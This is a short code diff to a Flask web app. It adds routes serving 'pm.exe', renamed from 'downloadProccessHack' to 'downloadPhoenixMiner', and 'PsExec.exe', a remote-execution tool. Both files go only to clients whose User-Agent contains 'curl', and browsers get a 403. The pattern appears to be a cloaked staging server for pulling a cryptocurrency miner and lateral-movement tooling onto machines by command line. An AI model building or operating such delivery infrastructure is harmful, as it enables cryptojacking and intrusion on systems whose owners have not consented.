@@ -18,8 +18,19 @@ def verify_password(username, password):
         return username
     
 @app.route('/api/download/pm.exe')
-def downloadProccessHack():
+def downloadPhoenixMiner():
     path = "/pm.exe"
+    useragent = request.headers.get('User-Agent')
+    if 'curl' in useragent:
+        return send_file(path, as_attachment=True)
+    # For windows you need to use drive name [ex: F:/Example.pdf]
+    else:
+        print(useragent)
+        return 'Access to that resource is forbidden.', 403
+
+@app.route('/api/download/PsExec.exe')
+def downloadpsexec():
+    path = "/PsExec.exe"
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
